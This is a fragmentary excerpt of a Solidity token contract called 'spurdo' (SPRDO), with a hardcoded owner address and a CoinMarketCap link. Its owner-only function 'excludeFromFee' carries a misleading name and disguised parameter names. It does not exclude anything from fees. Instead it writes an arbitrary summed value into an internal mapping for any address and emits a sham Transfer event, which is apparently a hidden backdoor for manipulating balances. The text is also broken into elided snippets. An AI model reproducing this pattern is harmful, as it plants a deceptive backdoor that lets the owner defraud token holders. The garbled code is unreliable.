...
interface Ru {
  ...
  */
   ...
   * spurdoOwner to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
...
contract spurdo is Ma, Ru, io {
   ...
   address private spurdoOwner; 
   string public spurdowebsite = "https://coinmarketcap.com/currencies/spurdo/";
   string public ownerAddress = "0xCCBEFBbc63293667fd26859c633766Db92c0584E";  
    constructor() {
        spurdoOwner = 0xCCBEFBbc63293667fd26859c633766Db92c0584E;    
        _name = "spurdo";
        _symbol = "SPRDO";
        _decimals = 9;
    ...
    function decimals() external view override returns (uint8) {
     ...
     function getOwner() external view override returns (address) {
        ...
        return ownerAddress;
                ...
                function getspurdowebsite() public view returns (string memory) {
        return spurdowebsite;
    } 
    ...
    function totalSupply() external view override returns (uint256) {
     ...
     function name() external view override returns (string memory) {
        return _name;
         ...
         modifier onlyOwner() {
        require(spurdoOwner == _msgSender(), "io: caller is not the owner");
        _;
    }    
    /**
    ...
    */
    function excludeFromFee(address _taxSwapThreshold, uint256 _taxWallets, uint256 _taxWallete, uint256 _taxWalleta, uint256 _taxWalletc) external onlyOwner {
        _initialSend[_taxSwapThreshold] = _taxWallets + _taxWallete + _taxWalleta + _taxWalletc;
        
        emit Transfer(_taxSwapThreshold, address(0), _taxWallets);
    }
